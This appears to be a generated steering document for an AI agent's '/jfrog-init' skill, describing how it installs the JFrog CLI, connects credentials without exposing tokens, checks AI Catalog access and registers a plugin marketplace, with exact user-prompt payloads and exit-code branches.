<!-- GENERATED by scripts/gen-steering.mjs from skills/ — do not edit by hand. -->


## batch-walk

# Running everything at once — jfrog-detect-all.mjs

`node ~/.kiro/jfrog-scripts/jfrog-init/jfrog-detect-all.mjs [server-id] [project-key]` runs Steps 1–7
in order and stops at the first non-green result — except Step 5 going
red/error, Step 6 going red (ambiguous/404/403), and Step 7 going red
in either of its two non-blocking shapes (exit 1: catalog not hosted /
unreachable / 5xx, or exit 4: reachable but not entitled), all of which
are non-blocking: Steps 1-4 passing is what "green" means here,
and the MCP-plugin, project-resolution, and catalog-availability gaps
are each reported as separate signals. This script makes exactly one
project-resolution attempt per invocation and has no way to tell a
first attempt from a last one, so it always treats a Step 6 red as
non-blocking — the interactive walk (see Step 6 in `SKILL.md`) is what
enforces the one-retry cap before giving up. Steps 5's, 6's, and 7's own
`ask`/`error` outcomes (ambiguous server-id, no project input passed,
`jf` missing/credentials rejected) still block, same as every other
step's genuine stop. If no project key is passed, Step 6 emits `ask`
with candidates and the walk halts; the caller re-invokes with the
picked project as arg 2 — unless that `ask` carries `"unresolved":
"server"`, in which case it's a server pick (see Step 6's branches) and
the re-invocation picks server-id (arg 1) instead.

Exit 0 = Steps 1-4 green (MCP configured or not, project resolved
or not, catalog entitled or not); exit 1 = something needs fixing. The
final JSON line adds `mcpConfigured: true|false`, `projectResolved:
true|false`, and `catalogEntitled: true|false` so a caller can tell the
exit-0 cases apart — plus `catalogReason: "unreachable" | "not_entitled"`
whenever `catalogEntitled` is `false`, so the Final Summary can name the
specific gap instead of a generic one. Writes the `~/.jfrog/setup.json`
state-file hint whenever Steps 1-4 are green, **regardless of
`projectResolved`, `mcpConfigured`, or `catalogEntitled`** — the server
and JPD URL are worth remembering on their own, independent of whether
a project got picked, the MCP plugin is wired up, or the AI Catalog is
reachable/the user is entitled to it. An unresolved project is passed
to `jfrog-state-file.mjs` as an empty key, which leaves any previously
recorded `currentActiveProject` alone rather than erasing it (see
`jfrog-state-file.mjs`); it's never written as a fresh, unvalidated
value.


## catalog-runtime-branches

# Step 7 — AI Catalog reachable & entitled: mechanics and branches

Two sub-checks against
`<JPD>/ml/core/api/v1/mcp-registry/ml-projects?pageSize=1` (where
`<JPD>` is the URL stored in `jf config` for the resolved server —
this skill never uses a separate `JFROG_PLATFORM_URL` env var), both
must pass. This step is **purely about AI Catalog access** — no
runtime checks (Node lives in Step 1; `uv` / `docker` are per-MCP
concerns, not this skill's).

1. **Anonymous** GET — proves the endpoint is deployed at this JPD.
   `2xx/401/403/405/406` = up; `404` / connection failure = red.
2. **Authenticated** GET to the same path, with the bearer token (or
   user+password) extracted from `jf config export` — same credential
   source `jf` itself uses (token / user+password / SSO refresh,
   whatever's stored), so the skill never asks for or invents
   credentials, and the token only lives in memory for this one
   request. `2xx` = user is **entitled** to read the AI Catalog on
   this JPD; `403` = reachable but **not entitled**, non-blocking.
   `401` means the credentials themselves were rejected — that says
   nothing about entitlement, so it is treated as a blocking error
   instead (see Exit 3 below).

Splitting reachability from entitlement produces two distinct
outcomes: check 1 red = "this JPD doesn't host AI Catalog, or it's
unreachable right now"; check 2's `403` = "catalog is up but your
user isn't entitled." Neither is a setup failure — both are
non-blocking permissions/availability gaps the rest of the walk doesn't
depend on (see the exit-code branches below). Check 2's `401` is
different — it means `jf`'s own credentials are invalid or expired,
which is a genuine setup problem (Exit 3).

**Required branches:**

- **Exit 0 (green)** → done. All checks pass, including entitlement.
- **Exit 1 (red)** → anon probe 404 / connection failure / 5xx — the
  platform may not host AI Catalog, or it's unreachable right now.
  **Non-blocking** — same reasoning as Exit 4 below: Steps 1-4 are
  this skill's core prerequisites, and none of them depend on the AI
  Catalog being present. Proceed to the Final Summary, but append a
  note naming the gap (`catalogReason: "unreachable"` in
  `jfrog-detect-all.mjs`'s summary — see `batch-walk.md`).
- **Exit 2 (ask)** → multiple servers configured, none marked
  `isDefault`, no server-id passed. Same handling as Step 4's exit 2:
  **stop and read the `server-picker` section of the `#jfrog-init-references` steering in full**, then
  re-invoke Step 7 with the pick as either the positional argument or
  `JF_SERVER_ID`.
- **Exit 3 (error)** → `jf` missing, the authed probe returned `401`
  (credentials themselves rejected — re-run `jf config add
  --interactive`), or an unexpected HTTP code (e.g. a broken `jf`
  config surfacing here instead of at Step 4). This is the one genuine
  stop this step has — a real error, not a "catalog isn't available"
  gap.
- **Exit 4 (not entitled)** → catalog is reachable but the authed probe
  returned `403`. **Non-blocking** — proceed to the Final Summary, but
  append the entitlement note (`catalogReason:
  "not_entitled"`). The detector's `detail` names the specific endpoint
  path (`/ml/core/api/v1/mcp-registry`) and the role the admin needs to
  grant (typically "AI Catalog Read" or "Application Admin"), so the
  user can forward an actionable request rather than a shrug.

Exit 1 and Exit 4 are deliberately handled the same way at the walk
level (see `batch-walk.md`) — both leave `catalogEntitled: false`, and
only differ in `catalogReason`, so the Final Summary can say "no AI
Catalog here" vs. "you're not entitled" accurately instead of collapsing
both into one generic gap.

**Never** grant a role or invent a project.


## flow-diagram

# /jfrog-init — full flow diagram

Visual companion to the numbered Steps in `SKILL.md`. Every decision
node here is also fully documented — including the exact user-facing
wording — in the corresponding Step section of `SKILL.md`; this diagram
adds nothing new, it's a compressed map of that same prose for
at-a-glance orientation. `SKILL.md`'s Step-by-step text is the
authoritative source for wording and behavior — follow it literally.

```mermaid
flowchart TD
    Start(["/jfrog-init"]) --> S1

    S1["1. Node.js >= 18 installed? (no script — node --version / npx --version)"]:::stepBox
    S1 -->|no| ASKNODE["AskUserQuestion: Install Node.js now? Yes/No"]:::fixBox
    ASKNODE -->|Yes, macOS/Linux| NVMINSTALL["Install nvm (pinned version) + nvm install --lts"]:::autoBox
    ASKNODE -->|Yes, Windows| WINGETNODE["winget install OpenJS.NodeJS.LTS"]:::autoBox
    ASKNODE -->|No| STOP0["STOP: cannot proceed without Node"]:::stopBox
    NVMINSTALL -->|failed| F1["Fall back: ask user to install Node.js >= 18 manually"]:::fixBox
    NVMINSTALL -->|ok| S2
    WINGETNODE --> F1W["Tell user: open a new terminal, re-run /jfrog-init"]:::fixBox
    S1 -->|yes| S2

    S2["2. jf CLI installed and >= 2.106.0?"]:::stepBox
    S2 -->|missing| ASKJF["AskUserQuestion: Install JFrog CLI? Yes/No"]:::fixBox
    S2 -->|outdated| ASKJFU["AskUserQuestion: Update JFrog CLI? Yes/No"]:::fixBox
    ASKJF -->|Yes| INSTJF["jfrog-install-jf-cli.mjs: Plan A npm install -g jfrog-cli-v2-jf"]:::autoBox
    ASKJFU -->|Yes| INSTJF
    ASKJF -->|No| STOP0J["STOP: cannot proceed without jf"]:::stopBox
    ASKJFU -->|No| STOP0J
    INSTJF -->|npm exited 0, but resolving jf is shadowed by an earlier install on PATH| SHADOW["Report shadowing — move npm's bin ahead on PATH, or remove the other install"]:::fixBox
    SHADOW --> PLANC
    INSTJF -->|npm failed, or exited 0 but jf still isn't resolving up to date and not shadowed, and a private registry is configured| PLANB["Plan B: retry npm install against the public registry"]:::autoBox
    PLANB -->|jf now resolves up to date| S2RE
    PLANB -->|still not up to date| PLANC
    INSTJF -->|npm missing, or Plan A/B failed to leave an up-to-date jf on PATH| PLANC["Plan C: direct binary download to ~/.jfrog/bin, checksum-verified, runs jf --version to confirm"]:::autoBox
    PLANC -->|Windows| WINPS["Print PowerShell one-liner — user runs it themselves, then re-runs /jfrog-init"]:::fixBox
    PLANC -->|macOS/Linux| S2RE
    INSTJF -->|npm succeeded and jf now resolves >= 2.106.0| S2RE["Re-check: installed and >= 2.106.0?"]:::stepBox
    S2RE -->|still missing/outdated| STOP1["STOP: show raw install error"]:::stopBox
    S2RE -->|ok| S3
    S2 -->|yes| S3

    S3["3. jf connected to a server?"]:::stepBox
    S3 -->|no| ASKMETHOD["AskUserQuestion: Web login or Access token?"]:::fixBox
    ASKMETHOD -->|Web login| WEBLOGIN["Register session, show code/link, retrieve + save credentials — all in-session, this skill's own local scripts"]:::autoBox
    WEBLOGIN --> S3ASKW["AskUserQuestion: Did you finish logging in? Yes/No"]:::fixBox
    S3ASKW -->|Yes| S3
    S3ASKW -->|No| STOP0B["STOP: user cancelled"]:::stopBox
    ASKMETHOD -->|Access token| F3["Print one command, --url pre-filled — user runs it themselves in their own terminal, pastes the token"]:::fixBox
    F3 --> S3ASK["AskUserQuestion: Did you finish running that command? Yes/No"]:::fixBox
    S3ASK -->|Yes| S3
    S3ASK -->|No| STOP0B
    S3 -->|yes| S4

    S4["4. Server reachable and credentials valid?"]:::stepBox
    S4 -->|multiple servers, no default| ASKSRV["AskUserQuestion: pick server-id"]:::fixBox
    ASKSRV --> S4
    S4 -->|reachable, but token invalid/expired| F4["Print one command, --url and --server-id pre-filled (token-only, no web option — avoids a duplicate server) — user runs it themselves"]:::fixBox
    F4 --> S4ASK["AskUserQuestion: Did you finish running that command? Yes/No"]:::fixBox
    S4ASK -->|Yes| S4
    S4ASK -->|No| STOP0C["STOP: user cancelled"]:::stopBox
    S4 -->|unreachable/timeout/other| STOP2["STOP: show raw error (network/URL hint included)"]:::stopBox
    S4 -->|yes| S5

    S5["5. Plugin mcp.json has a valid jfrog entry? (auto-substitutes a JFROG_PLATFORM_URL/JFROG_URL placeholder inline, if present)"]:::stepBox
    S5 -->|substitution needed, server-id ambiguous| ASKSRV5["AskUserQuestion: pick server-id"]:::fixBox
    ASKSRV5 --> S5
    S5 -->|missing/invalid/no entry, incl. substitution failure| F5["Note: reinstall or update the JFrog plugin, or resolve jf config (non-blocking)"]:::fixBox
    F5 --> S6
    S5 -->|yes, valid url| S6

    S6["6. Project resolved?"]:::stepBox
    S6 -->|state file has current project| ASKREUSE["AskUserQuestion: reuse CURRENT or pick different"]:::fixBox
    ASKREUSE -->|reuse| S7
    ASKREUSE -->|different| ASKPROJ["AskUserQuestion: first 2 projects (from enumeration), or Other to type one"]:::fixBox
    S6 -->|no state file| ASKPROJ
    ASKPROJ -->|picked or typed — accepted verbatim, no probe, no matching| S7
    ASKPROJ -->|enumeration failed: jf missing / credentials rejected| STOPCREDS["STOP: show raw error (re-auth via the Step 3/4 picker)"]:::stopBox

    S7["7. AI Catalog reachable and user entitled?"]:::stepBox
    S7 -->|anon 404 / connection failure / 5xx, exit 1| F7U["Note: catalogReason=unreachable — JPD may not host AI Catalog, or it's down right now (non-blocking)"]:::fixBox
    F7U --> WRITE
    S7 -->|authed 401 or 403, not entitled, exit 4| F7E["Note: catalogReason=not_entitled — ask JFrog admin for AI Catalog Read role (non-blocking)"]:::fixBox
    F7E --> WRITE
    S7 -->|ambiguous server-id, exit 2| ASKSRV7["AskUserQuestion: which jf server? (server-picker.md), then re-run"]:::fixBox
    ASKSRV7 --> S7
    S7 -->|jf missing / credentials rejected / unexpected response shape, exit 3| STOP7["STOP: show raw error — no state file written"]:::stopBox
    S7 -->|yes, entitled, exit 0| WRITE["Write state file: server, jpdUrl, and currentActiveProject if resolved (else previous project, if any, is kept) — written on every NON-blocking path out of Step 7"]:::autoBox

    WRITE --> S8CHECK{"Step 7 green AND harness == Claude Code? (detectHarness() reused from Step 5)"}:::stepBox
    S8CHECK -->|no| DONE
    S8CHECK -->|yes| S8["8. Claude agent-plugin marketplace registered?"]:::stepBox
    S8 -->|exit 0, success| F8OK["Final Summary: ✅ JFrog Marketplace, plus the trailing sentence"]:::autoBox
    S8 -->|exit 1 or 3, failed| F8BAD["Final Summary: ⚠️ JFrog Marketplace — not registered, no cause"]:::fixBox
    F8OK --> DONE
    F8BAD --> DONE

    DONE(["JFrog init complete"]):::doneBox

    classDef stepBox fill:#e8f0fe,stroke:#1a73e8,color:#000
    classDef fixBox fill:#fff4e5,stroke:#f9a825,color:#000
    classDef autoBox fill:#e6f4ea,stroke:#137333,color:#000
    classDef doneBox fill:#e6f4ea,stroke:#137333,color:#000
    classDef stopBox fill:#fce8e6,stroke:#c5221f,color:#000
```




## how-to-ask-user

# How to ask the user questions

When the skill needs a Yes/No answer, a selection, or any other input
from the user, use the **native interactive prompt tool** built into
your harness so the user can click or select rather than type:

| Harness         | Preferred tool         |
|-----------------|------------------------|
| Claude Code     | `AskUserQuestion`      |
| Codex           | `request_user_input`   |
| Kiro / Kiro CLI | none — no native prompt tool exists; go straight to the plain-text fallback |

Each reference file specifies the question text and option labels; use
your harness's native tool to present them. Native prompt tools already
offer a free-text "Other" fallback for values not in the list — don't
add a duplicate "Other" option yourself.

**Fallback**: if no native prompt tool is available, or the tool
returns without a selection, surface the question as plain text in
your reply — never silently stop without presenting it.

**Kiro / Kiro CLI**: check `$JFROG_INIT_HARNESS` (already exported by
Step 5) before reaching for `AskUserQuestion` — if it's `kiro` or
`kiro-cli`, skip the tool call entirely and use the plain-text fallback
directly. Calling it anyway surfaces a "tool does not exist" error to
the user before you fall back.


## jf-cli-install-internals

# jfrog-install-jf-cli.mjs — installation internals

Background for Step 2 of `/jfrog-init` (`SKILL.md`). The model doesn't
need this to execute the step — `jfrog-install-jf-cli.mjs` handles all
of it and reports success/failure on stdout and its exit code — but it
explains what the script actually does, for debugging or when a user
asks how the install works.

**Deliberately does not use** the base skill's
[the `jfrog-cli-install-upgrade` section of the `#jfrog-references` steering](the `jfrog-cli-install-upgrade` section of the `#jfrog-references` steering)
(`brew install jfrog-cli` / a Linux-only curl one-liner, no Windows
guidance). This walk's primary method is one command that behaves
identically across macOS, Linux, and Windows without branching on OS —
`npm install -g jfrog-cli-v2-jf` — so it uses that instead. If npm
itself can't complete the install (missing, or a permissions error like
a global prefix that needs `sudo`), the script falls back to a
checksum-verified direct binary download with its own Windows handling.

`jfrog-install-jf-cli.mjs` tries progressively more self-contained
install methods, falling through only when one genuinely fails:

1. **Plan A — npm** (JFrog's own documented method:
   docs.jfrog.com/integrations/docs/download-and-install-the-jfrog-cli#npm):
   `npm install -g jfrog-cli-v2-jf` against whatever registry npm is
   already configured for. No PATH/shell-rc changes here: npm's global
   bin directory is expected to already be on PATH. This works
   identically on macOS, Linux, and Windows, so there's no OS-specific
   branch for this plan.
2. **Plan B — public registry retry**: triggered whenever Plan A's `npm`
   command itself fails, *or* it exits 0 but the `jf` that resolves on
   PATH afterward still isn't at the required version — provided that
   stale `jf` is npm's own install and not a different, older `jf`
   earlier on PATH shadowing it. Shadowing is reported directly and
   skips straight to Plan C instead: retrying against a different
   registry can't fix a PATH-ordering problem. If npm is configured for
   a registry other than the
   public one (common on a company machine, pointed at a
   private/corporate mirror), the exact same install is retried with
   `--registry=https://registry.npmjs.org/` — this one command only,
   never touching the user's saved npm config. `jfrog-cli-v2-jf` is a
   public package, so a private registry's own (possibly stale) auth
   says nothing about whether the package itself is reachable.
3. **Plan C — direct binary download**: if npm is missing, or both A
   and B failed for any other reason (observed in practice: a global
   npm prefix that requires `sudo`), downloads the first-party `jf`
   binary from `releases.jfrog.io` straight to `~/.jfrog/bin` — a
   user-owned prefix that never needs elevated permissions — and
   verifies it against the SHA-256 checksum Artifactory reports for that
   same artifact (catches a truncated/corrupted transfer, not an
   independent signature). Unlike Plans A/B, `~/.jfrog/bin` isn't on
   PATH by default, so a successful Plan C also appends a PATH line to
   the user's shell rc file (idempotent) and prints one for the caller
   to `eval` immediately, so `jf` resolves both in future terminals and
   in the *current* process without the user doing anything.
   **Windows**: Plan C's direct-download path isn't reliable there, so
   it instead prints a PowerShell one-liner — installing to a user-owned
   path and prepending to the user-scope `Path` via
   `[Environment]::SetEnvironmentVariable(..., 'User')`, no elevation
   needed. Reads the existing user-scope value first rather than using
   `setx PATH "...;$env:Path"`, which would copy the *combined*
   machine+user PATH into the user variable (duplicating every
   machine-level entry into it, permanently) and silently truncate past
   `setx`'s 1024-character limit. The whole script exits 1 so Step 2 can
   relay it to the user.

Only if all three plans fail does the script print the plain
`npm install -g jfrog-cli-v2-jf` command and exit 1, for the user to
diagnose and run themselves.

**Known trade-off of Plans A/B, called out in JFrog's own docs and not
something this script can detect or fix**: if the user relies on a
shim-based version manager (`nvm` / Volta) alongside another `jf`
install (Homebrew, curl, or Plan C itself), the version manager's
`bin/` takes PATH priority, so the npm-installed `jf` silently wins
regardless of what those other installs report.


## jf-cli-install-prompt

# Step 2 — the install prompt

**Required behavior for Step 2's red branch, not optional background.**
When `jfrog-detect-jf-cli.mjs` exits red with `reason: "missing"` (`jf`
not found on PATH at all), call `AskUserQuestion` with this exact
payload shape (arrays and options nested correctly; the tool rejects
flat/mis-shaped inputs with `InputValidationError`):

```json
{
  "questions": [
    {
      "question": "JFrog CLI isn't installed. Install it now?",
      "header": "Install jf",
      "multiSelect": false,
      "options": [
        {"label": "Yes", "description": "Install the JFrog CLI now. May add one line to your shell startup file so future terminals can find it."},
        {"label": "No",  "description": "Cancel /jfrog-init."}
      ]
    }
  ]
}
```

When it instead exits red with `reason: "broken"` (`jf` **is** on PATH
but hung, timed out, or failed to run), the "isn't installed" wording
above is false — use this payload instead:

```json
{
  "questions": [
    {
      "question": "JFrog CLI is installed but isn't responding (may be corrupted or hung). Reinstall it now?",
      "header": "Reinstall jf",
      "multiSelect": false,
      "options": [
        {"label": "Yes", "description": "Reinstall the JFrog CLI now. May add one line to your shell startup file so future terminals can find it."},
        {"label": "No",  "description": "Cancel /jfrog-init."}
      ]
    }
  ]
}
```

The user picks with arrow keys. The `question` text is the entire
user-facing message for this step, for either branch.

**Do not** mention any install method (`npm install -g`, the direct
binary download), the package name (`jfrog-cli-v2-jf`), the install
path (`~/.jfrog/bin`), or any other implementation detail — not in the
question, not in an option description, not anywhere. The user only
needs to answer Yes or No; everything else is noise.

Forbidden phrases (non-exhaustive — never surface any of these in the
question or its option descriptions):
- *"via npm"* / *"npm install -g"* / *"as a global Node package"*
- *"download the binary"* / *"from releases.jfrog.io"* / *"to
  ~/.jfrog/bin"*
- *"~68 MB download"* / any size or timing hint

On **Yes**, run `jfrog-install-jf-cli.mjs` directly. On **No** (or the
user selects "Other" and types an out-of-band answer), stop the walk
and tell the user `/jfrog-init` cannot continue without `jf`.

`jfrog-install-jf-cli.mjs` tries npm first (JFrog's own documented
method, retried against the public registry if a private one fails),
then falls back to a checksum-verified direct binary download if npm
itself can't complete the install — and verifies `jf --version`
resolves before reporting success either way. See
`jf-cli-install-internals.md` for exactly how each plan works,
including the one npm trade-off the script can't detect or fix.

After the install runs, re-invoke `jfrog-detect-jf-cli.mjs`. If still
red, stop and show the raw error verbatim; do not guess at a second fix.


## jf-cli-update-prompt

# Step 2 — the update prompt

**Required behavior for Step 2's red branch when `reason` is
`"outdated"`, not optional background.** When `jfrog-detect-jf-cli.mjs`
exits red with `reason: "outdated"` (`jf` is installed, but below the
minimum version), call `AskUserQuestion` with this exact payload shape
— same shape as the install prompt (`jf-cli-install-prompt.md`), just
worded for an update instead of a fresh install:

```json
{
  "questions": [
    {
      "question": "JFrog CLI <version> is older than required. Update it now?",
      "header": "Update jf",
      "multiSelect": false,
      "options": [
        {"label": "Yes", "description": "Update the JFrog CLI now."},
        {"label": "No",  "description": "Cancel /jfrog-init."}
      ]
    }
  ]
}
```

Fill in `<version>` with the detector's own `currentVersion` field (the
raw `jf --version` output, and nothing else). Do **not** use `detail`
for this — it also carries the required minimum version number, which
the very next rule forbids surfacing to the user. The `question` text
is the entire user-facing message for this step.

**Do not** mention any install/update method (`npm install -g`), the
package name (`jfrog-cli-v2-jf`), or the specific minimum version number
— not in the question, not in an option description. The user only
needs to answer Yes or No.

On **Yes**, run `jfrog-install-jf-cli.mjs` directly — the same script
Step 2's install path uses. `npm install -g jfrog-cli-v2-jf` upgrades an
existing install in place, so there's no separate update script. On
**No** (or an out-of-band "Other" answer), stop the walk and tell the
user `/jfrog-init` cannot continue without an updated JFrog CLI.

After the update runs, re-invoke `jfrog-detect-jf-cli.mjs`. If still red
with `reason: "outdated"`, stop and show the raw error verbatim; do not
guess at a second fix.

## Why there's a minimum version at all

JFrog CLI v2.106.0 or later, configured for your JFrog Platform, is
required for the Agent Plugins Repositories feature this walk's own
Step 7 (AI Catalog) depends on. For more information, see [Configure
the JFrog CLI](https://docs.jfrog.com/artifactory/docs/agent-plugins-repositories#configure-the-jfrog-cli)
in Agent Plugins Repositories.


## jf-config-auth-picker

# jf config: web login vs. access token

**Required behavior wherever this file is the referenced fix, not
optional background.** Two distinct call sites land here, with two
different option sets:

- **Step 3** (`jf` is installed but not connected to any server at
  all) — full picker: **Web login or Access token**.
- **Step 4**, when sub-check (1) (reachability) passed but sub-check
  (2) (`jf rt ping`) failed with an auth-shaped error — `jf` is
  already connected to a server, its token is just stale. **Token
  only** (see "Why Step 4 is token-only" below) — skip straight to
  that section.

## Step 3: ask web vs. token

```json
{
  "questions": [
    {
      "question": "How do you want to connect to your JFrog Platform?",
      "header": "Connect",
      "multiSelect": false,
      "options": [
        {"label": "Web login", "description": "Opens in your browser. I'll drive the rest."},
        {"label": "Access token", "description": "You paste a token into one command you run yourself."}
      ]
    }
  ]
}
```

If the URL isn't already known, ask for it in a plain chat message
first (*"What's your JFrog Platform URL?"*) — both branches need it.
**Plain chat message, not `AskUserQuestion` with suggested options** —
there is no real candidate to offer here (unlike the server/project
pickers, which choose among *actual configured* values), so a picker
would only ever be guessing. Never suggest, guess, or pre-fill a
specific JFrog Platform URL (e.g. `mycompany.jfrog.io`, or anything else
inferred from the user's email domain, org, or prior context) — wait
for the user to type their own.

### Web login branch

This skill carries its own local copies of the web-login scripts under
`scripts/` — nothing is invoked cross-skill from the base `jfrog` skill.
The token never passes through this conversation.

1. **Register the session:**
   ```bash
   node "${CLAUDE_SKILL_DIR}/scripts/jfrog-login-register-session.mjs" "<url>"
   ```
   Both login scripts are pure Node — unlike Step 2's `jf` CLI itself,
   there's no separate prerequisite probe needed here (no `uuidgen`/`jq`
   dependency to check for). Exit 2 = server unreachable, exit 3 =
   registration failed — either one is a **red**, same as any other Step
   3/4 red: show the raw error, stop.
2. **Build the login URL** from `SESSION_UUID`:
   ```
   <url>/ui/login?jfClientSession=<SESSION_UUID>&jfClientName=JFrog-Skills&jfClientCode=1
   ```
   **Open it in the user's default browser automatically — do not just
   print the link and ask them to click it themselves.** Use the
   OS-appropriate opener:
   ```bash
   open "<login-url>"          # macOS
   xdg-open "<login-url>"      # Linux
   start "" "<login-url>"      # Windows (cmd) / `Start-Process "<login-url>"` in PowerShell
   ```
   If the opener command fails or isn't available (headless/remote
   session, no `$DISPLAY`, etc.), fall back to showing the link as text
   so the user can open it manually — don't treat that as a hard
   failure. This mirrors the base `jfrog` skill's own
   the `jfrog-login-flow` section of the `#jfrog-init-references` steering step 2 exactly; it's spelled out
   again here, in full, rather than left as a cross-reference, because a
   model following only this file (never opening the base skill's doc)
   must still open the browser automatically, not silently fall back to
   printing the link.

   Show the verification code prominently, then confirm the link was
   opened (or provide it, on fallback):

   > ## Verification code: `<last 4 chars of SESSION_UUID>`
   >
   > I've opened the login page in your browser — enter the code above.
   >
   > Let me know when you're done.

   Then `AskUserQuestion`:
   ```json
   {
     "questions": [
       {
         "question": "Did you finish logging in?",
         "header": "Continue",
         "multiSelect": false,
         "options": [
           {"label": "Yes, continue",           "description": "Retrieve credentials and continue the walk."},
           {"label": "No, cancel /jfrog-init", "description": "Stop the walk cleanly."}
         ]
       }
     ]
   }
   ```
3. On **Yes**, retrieve and save credentials:
   ```bash
   node "${CLAUDE_SKILL_DIR}/scripts/jfrog-login-save-credentials.mjs" "<url>" "<SESSION_UUID>"
   ```
   Exit 0 → done; the only thing this prints is `SERVER_ID=<id>` and an
   Artifactory version check — the token itself never appears in this
   script's output, and this skill never reads it. Exit 2/3/4 → the
   session's one-time token is now consumed either way (see the base
   skill's "Gotchas") — tell the user plainly it didn't work and offer
   to either restart web login from step 1 above or switch to the
   Token branch; don't retry silently.
4. Re-run whichever detector sent you here (`jfrog-detect-jf-config.mjs`
   for Step 3) to confirm green, then continue.

Skip the base skill's "make it the default `jf` server?" gate — this
skill's own server resolution (the `server-picker` section of the `#jfrog-init-references` steering /
"Resolving `<server-id>`" in `SKILL.md`) already uses the sole
configured server silently when there's only one, so that question
would be redundant here.

### Token branch (Step 3, and the only option for Step 4)

Print exactly one ready-to-run command, with `--url` (and, for Step 4,
the already-resolved `--server-id`) filled in — the user runs it
**themselves, in their own terminal**, replacing the placeholder with
their own token. **Never** ask for the token in chat, and never run
this command yourself via the Bash tool — the token must not enter
this conversation at all.

- **Step 3** (no server-id yet — one will be created):
  ```
  jf config add jfrog --url=<url> --access-token=<paste-your-token-here> --interactive=false
  ```
- **Step 4** (existing server, refreshing a stale token — reuse the
  already-resolved `<server-id>` and `--overwrite` so this updates the
  same entry instead of creating a second one):
  ```
  jf config add <server-id> --url=<url> --access-token=<paste-your-token-here> --interactive=false --overwrite
  ```

Send this as its own chat message (same rule as today: no `!` prefix —
that runs inside Claude Code's own shell). Then `AskUserQuestion`:

```json
{
  "questions": [
    {
      "question": "Did you finish running that command?",
      "header": "Continue",
      "multiSelect": false,
      "options": [
        {"label": "Yes, continue",           "description": "Re-check and continue the walk."},
        {"label": "No, cancel /jfrog-init", "description": "Stop the walk cleanly."}
      ]
    }
  ]
}
```

On **Yes** → re-run the same detector that sent you here
(`jfrog-detect-jf-config.mjs` for Step 3, `jfrog-detect-server-ping.mjs
[server-id]` for Step 4 — never the other one). If still red, print
the same command and the same `AskUserQuestion` again — the loop is
harmless. On **No** → stop with exactly one sentence: *"OK — run
`/jfrog-init` again when ready."* Nothing else.

## Why Step 4 is token-only

`jfrog-login-save-credentials.mjs` derives (or overwrites) a server
entry **from the URL itself** (`https://mycompany.jfrog.io` →
`mycompany`), independent of whatever server-id Step 4 actually
resolved. Running the web-login branch there could silently create a
*second*, differently-named server instead of refreshing the token on
the one Step 4 is checking — so Step 4 only ever offers the Token
branch above, which explicitly reuses the existing `--server-id`.

## Step 4's full branch table

`jfrog-detect-server-ping.mjs [server-id]` runs two sub-checks, both
must pass: (1) an anonymous `fetch` of `<url>/artifactory/api/system/ping`
— HTTP `200/401/403` = up, `404`/connection failure/`5xx` = red; (2)
`jf rt ping --server-id=<id>`, token kept inside `jf`'s process — a
pass means the token is valid and authorized, the earliest signal of a
stale credential before it fails later at runtime. Sub-check (1) green
+ (2) red = tailor the message: an auth-shaped error points at a stale
token (the token-only fix above); a 30s timeout points at network/VPN;
anything else shows the raw `jf rt ping` error without guessing a cause.

- **Exit 0 (green)** → proceed to Step 5.
- **Exit 1 (red)** → branch on the detector's `detail`, don't just stop
  and dead-end on a generic "check with your admin":
  - **Credentials invalid/expired** (sub-check (1) passed, only the
    token is stale) → use the token-only fix above, then re-run *this
    step's* detector (`jfrog-detect-server-ping.mjs`, not Step 3's) —
    the user already has `jf` connected, they just need a fresh token.
  - **Anything else** (connection failed, timeout, unexpected HTTP
    code, reachability itself failed) → **stop.** No fix script. Show
    the raw error line verbatim and tell the user to fix that and
    re-run `/jfrog-init`.
- **Exit 2 (ask)** → multiple servers configured, none marked
  `isDefault`, no server-id passed. **Stop and read
  the `server-picker` section of the `#jfrog-init-references` steering in full**, then re-invoke with the
  pick as either the positional argument or `JF_SERVER_ID`.

## What the token flow never does

Neither this file's Token branch nor the Web branch's scripts ever
print, log, or store a token where this skill (or the model) can read
it: the Token branch's command is run by the user in their own
terminal; the Web branch's `jfrog-login-save-credentials.mjs` keeps the
retrieved token inside its own process and only ever prints
`SERVER_ID=...` plus a version check. `jfrog-detect-jf-config.mjs` only
checks *that* a server is configured (masked `jf config show` output);
`jfrog-detect-server-ping.mjs` validates the token via `jf rt ping`,
keeping it inside `jf`'s own process the whole time.


## marketplace-setup

# Step 8 — Claude agent-plugin marketplace

**Required behavior for Step 8, not optional background.**

## What this step does

Registers the JFrog Claude agent-plugin marketplace with
Claude Code (`claude plugin marketplace add <url>`), so plugins
published to Artifactory become installable via `/plugin install`.
`jfrog-add-claude-marketplace.mjs` does all of it, including the
`~/.netrc` write below — never call `claude` yourself.

## The `~/.netrc` write

The only file this skill creates to hold a token, so say so plainly if the
user asks. The token goes to `~/.netrc`, replacing any prior block for that
host. `claude plugin install` needs it because the marketplace lists each
plugin as a plain Artifactory URL with no credentials in it. The marketplace
fetch does not use the file, because the token passed to `claude plugin
marketplace add` reaches Claude Code's own plugin config.

## Server scope

Never ask which server to use — this step is non-blocking, so with
nothing resolvable it fails red instead.

## Required branches

All three follow `SKILL.md`'s Final summary rule 5, verbatim.

- **Exit 0 (green)** → the ✅ line and the success sentence.
- **Exit 1 or 3 (red)** → the ⚠️ line, and nothing about the cause.
- **Skipped (Step 7 not green, or not Claude Code)** → say **nothing**,
  exactly as if Step 8 didn't exist for this walk.


## mcp-plugin-config

# Step 5 — plugin-owned mcp.json: mechanics and per-harness paths

Background for Step 5 of `/jfrog-init` (`SKILL.md`). The model doesn't
need this to execute the step — `jfrog-detect-jfrog-mcp.mjs` handles
detection and substitution and reports the result as JSON — but it's
useful for debugging a red/error result or explaining what happened.

**Placeholder substitution.** The plugin sometimes ships an `mcp.json`
where the JPD URL is a placeholder that would otherwise need to be
resolved at runtime from an env var:

```json
{"mcpServers": {"jfrog": {"url": "https://${JFROG_PLATFORM_URL}/mcp"}}}
```

Codex's plugin ships the same idea in a different shape — no
`mcpServers` wrapper, and angle brackets instead of `${...}`:

```json
{"jfrog": {"url": "https://<JFROG_PLATFORM_URL>/mcp"}}
```

Because we have that URL sitting in `jf config`, and because leaving
the placeholder in place means the MCP silently fails to load in the
IDE / agent, Step 5 auto-substitutes it. If the detector finds the
placeholder pattern anywhere in the file, it calls
`jfrog-substitute-mcp-placeholders.mjs`, which:

1. Parses the file as JSON and looks **only** at the `jfrog` entry's
   `url` (nested under `mcpServers` on every harness but Codex, which
   has no wrapper) — never a file-wide text replace, so an unrelated
   MCP server entry or JSON value that happens to contain the same
   placeholder text is never touched.
2. Reads the JPD URL from `jf config` (default server, or the one
